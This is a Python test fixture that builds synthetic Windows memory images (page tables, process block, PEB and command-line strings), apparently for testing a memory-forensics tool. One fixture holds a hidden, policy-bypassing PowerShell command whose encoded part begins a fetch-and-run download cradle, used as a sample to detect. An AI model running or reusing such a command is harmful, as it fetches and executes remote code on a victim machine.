r"""Synthetic Windows RAM image with a reachable PEB / process parameters.

    0x01000  kernel PML4 (kernel DTB)   0x02..0x04 kernel PDPT/PD/PT
    0x05000  process PML4               user PDPT/PD/PT allocated on demand
    0x10000  "..." _EPROCESS object  (Proc tag, DTB, PID, name, Peb ptr @+0x2F0)
    ...      one page each: PEB, process parameters, and every string buffer
"""

from __future__ import annotations

import struct

PAGE = 0x1000
KBASE = 0xFFFFF80000000000
RW = 3

P_KPML4 = 1
P_PPML4 = 5
P_SYSTEM = 0x10
N_PAGES = 0x60

VA_PEB = 0x1A2000
VA_PARAMS = 0x1B0000
VA_IMG = 0x1C0000
VA_CMD = 0x1C1000
VA_CWD = 0x1C2000
VA_TITLE = 0x1C3000
VA_ENV = 0x1C4000


def _idx(va, lvl):
    return (va >> (39 - 9 * lvl)) & 0x1FF


def kva(page):
    return KBASE + (page - P_SYSTEM) * PAGE


class Builder:
    def __init__(self):
        self.mem = bytearray(N_PAGES * PAGE)
        self._next = 0x11
        self._pt_cache = {}
        self._kernel_tables()
        self._proc_pml4()

    def alloc(self):
        p = self._next
        self._next += 1
        return p

    def _kernel_tables(self):
        m = self.mem
        struct.pack_into("<Q", m, P_KPML4 * PAGE + _idx(KBASE, 0) * 8, 2 * PAGE | RW)
        struct.pack_into("<Q", m, P_KPML4 * PAGE + 0x1ED * 8, P_KPML4 * PAGE | RW)
        struct.pack_into("<Q", m, 2 * PAGE, 3 * PAGE | RW)
        struct.pack_into("<Q", m, 3 * PAGE, 4 * PAGE | RW)
        for i in range(N_PAGES - P_SYSTEM):
            struct.pack_into("<Q", m, 4 * PAGE + i * 8, (P_SYSTEM + i) * PAGE | RW)

    def _proc_pml4(self):
        m = self.mem
        struct.pack_into("<Q", m, P_PPML4 * PAGE + 0x1ED * 8, P_PPML4 * PAGE | RW)
        struct.pack_into("<Q", m, P_PPML4 * PAGE + _idx(KBASE, 0) * 8, 2 * PAGE | RW)

    def map_user(self, va, phys_page):
        m = self.mem

        def sub(parent, i):
            k = (parent, i)
            if k not in self._pt_cache:
                c = self.alloc()
                self._pt_cache[k] = c
                struct.pack_into("<Q", m, parent * PAGE + i * 8, c * PAGE | RW)
            return self._pt_cache[k]

        pdpt = sub(P_PPML4, _idx(va, 0))
        pd = sub(pdpt, _idx(va, 1))
        pt = sub(pd, _idx(va, 2))
        struct.pack_into("<Q", m, pt * PAGE + _idx(va, 3) * 8, phys_page * PAGE | RW)

    def _ustr(self, page, off, va_buf):
        # UNICODE_STRING at page:off pointing at va_buf; caller fills the buffer
        m = self.mem
        # length filled later by string()
        struct.pack_into("<Q", m, page * PAGE + off + 8, va_buf)

    def _wbuf(self, va, text):
        pg = self.alloc()
        data = text.encode("utf-16-le")
        self.mem[pg * PAGE:pg * PAGE + len(data)] = data
        self.map_user(va, pg)
        return len(data)

    def process(self, name, pid, *, cmdline, image_path, cwd="C:\\Windows",
                title="", env=None):
        m = self.mem
        eo = P_SYSTEM * PAGE
        m[eo + 0x10:eo + 0x14] = b"Proc"
        struct.pack_into("<Q", m, eo + 0x20, P_PPML4 * PAGE)     # DTB
        struct.pack_into("<I", m, eo + 0x30, pid)
        nm = name.encode()
        m[eo + 0x50:eo + 0x50 + len(nm) + 1] = nm + b"\x00"
        struct.pack_into("<Q", m, eo + 0x2F0, VA_PEB)            # Peb pointer

        # PEB
        peb_pg = self.alloc()
        struct.pack_into("<Q", m, peb_pg * PAGE + 0x10, VA_IMG)   # ImageBase
        struct.pack_into("<Q", m, peb_pg * PAGE + 0x20, VA_PARAMS)
        self.map_user(VA_PEB, peb_pg)

        # RTL_USER_PROCESS_PARAMETERS
        pp_pg = self.alloc()
        self.map_user(VA_PARAMS, pp_pg)

        def field(off, va, text):
            n = self._wbuf(va, text)
            struct.pack_into("<HH", m, pp_pg * PAGE + off, n, n + 2)
            struct.pack_into("<Q", m, pp_pg * PAGE + off + 8, va)

        field(0x38, VA_CWD, cwd)
        field(0x60, VA_IMG, image_path)
        field(0x70, VA_CMD, cmdline)
        if title:
            field(0xB0, VA_TITLE, title)
        if env:
            blob = ("".join(f"{k}={v}\x00" for k, v in env.items()) + "\x00")
            pg = self.alloc()
            data = blob.encode("utf-16-le")
            m[pg * PAGE:pg * PAGE + len(data)] = data
            self.map_user(VA_ENV, pg)
            struct.pack_into("<Q", m, pp_pg * PAGE + 0x80, VA_ENV)
        return self

    def lime(self):
        payload = bytes(self.mem)
        return (struct.pack("<IIQQQ", 0x4C694D45, 1, 0, len(payload) - 1, 0)
                + payload)


def image_encoded_powershell() -> bytes:
    return Builder().process(
        "powershell.exe", 6120,
        image_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\"
                   "powershell.exe",
        cmdline="powershell.exe -nop -w hidden -ep bypass -enc "
                "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBD"
                "AGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgA",
        cwd="C:\\Users\\rita\\Downloads",
        title="Windows PowerShell").lime()


def image_plain() -> bytes:
    return Builder().process(
        "notepad.exe", 4212,
        image_path="C:\\Windows\\System32\\notepad.exe",
        cmdline='"C:\\Windows\\System32\\notepad.exe" C:\\Users\\rita\\notes.txt',
        cwd="C:\\Users\\rita", title="notes.txt - Notepad",
        env={"USERNAME": "rita", "TEMP": "C:\\Users\\rita\\AppData\\Local\\Temp"},
    ).lime()
